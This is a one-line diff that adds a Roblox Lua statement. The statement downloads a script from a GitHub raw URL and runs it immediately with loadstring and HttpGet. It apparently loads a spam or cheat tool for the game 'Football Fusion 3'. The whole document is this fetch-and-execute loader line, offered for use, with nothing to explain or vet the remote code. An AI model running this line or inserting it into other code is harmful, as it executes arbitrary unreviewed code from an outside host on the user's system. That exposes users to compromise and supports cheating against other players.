@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/football-fusion-3-spam6-gidalbg7gtk9an.lua"))()
